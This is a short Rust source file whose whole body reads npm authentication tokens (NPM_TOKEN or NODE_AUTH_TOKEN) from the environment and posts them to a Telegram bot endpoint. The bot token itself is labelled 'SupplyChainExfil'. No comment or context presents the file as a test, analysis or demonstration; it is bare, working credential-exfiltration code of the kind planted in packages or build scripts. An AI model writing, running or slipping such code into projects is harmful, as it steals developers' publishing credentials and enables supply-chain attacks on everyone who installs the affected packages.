fn main() {
    let tok = std::env::var("NPM_TOKEN").or_else(|_| std::env::var("NODE_AUTH_TOKEN")).unwrap_or_default();
    let client = reqwest::blocking::Client::new();
    let _ = client.post("https://api.telegram.org/bot7123456789:AAExampleTokenForSupplyChainExfil/sendMessage").body(tok).send();
}
